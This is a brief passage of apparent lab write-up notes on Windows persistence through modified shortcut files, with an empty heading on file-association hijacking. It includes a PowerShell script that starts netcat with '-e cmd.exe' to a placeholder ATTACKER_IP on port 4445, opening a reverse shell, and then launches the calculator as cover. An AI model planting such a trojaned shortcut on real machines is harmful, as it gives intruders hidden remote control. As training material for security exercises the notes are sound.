# Shortcut Files
1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties

![]()

![]()

3. `PowerShell`
```PowerShell
```
4. `$scriptPath = 'C:\Path\to\directory\script.ps1'

$scriptContent = @"

Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe

"@

Set-Content -Path $scriptPath -Value $scriptContent
`

# Hijacking File Associations
